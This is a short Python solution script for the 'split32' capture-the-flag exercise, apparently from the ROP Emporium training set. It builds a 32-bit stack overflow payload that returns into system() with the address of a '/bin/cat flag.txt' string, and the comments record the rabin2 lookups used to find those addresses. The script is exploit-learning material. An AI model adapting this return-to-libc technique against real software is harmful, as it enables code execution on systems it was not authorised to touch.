import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./split32"

# rabin2 -z ./split32 | grep "/bin/cat flag.txt" | awk '{print $3}'
CMD_STR_ADDR = struct.pack("<I", 0x0804A030)
# rabin2 -i ./split32 | grep "system" | awk '{print $2}'
SYSTEM_ADDR = struct.pack("<I", 0x080483E0)

JUNK = b"A" * 44
RET_ADDR = b"A" * 4

payload = JUNK + SYSTEM_ADDR + RET_ADDR + CMD_STR_ADDR

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
